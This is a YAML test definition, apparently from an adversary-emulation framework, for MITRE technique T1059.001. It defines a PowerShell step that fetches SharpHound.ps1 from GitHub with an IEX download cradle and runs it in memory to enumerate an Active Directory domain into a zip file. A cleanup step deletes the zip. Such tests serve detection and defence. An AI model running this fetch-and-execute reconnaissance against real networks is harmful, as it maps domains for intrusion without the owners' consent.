api_version: "2.0"
name: Run Bloodhound from Memory using Download Cradle
description: |
    Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.

    Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
uuid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1059: Command and Scripting Interpreter'
    subtechniques:
        - 'T1059.001: PowerShell'
requirements:
    platforms:
        - os: windows
steps:
    - name: run-bloodhound-from-memory-using-download-cradle
      inline: |
        write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
        IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
        Invoke-BloodHound -OutputDirectory $env:Temp
        Start-Sleep 5
      executor: powershell
      cleanup:
        inline: |
            Remove-Item $env:Temp\*BloodHound.zip -Force
        executor: powershell
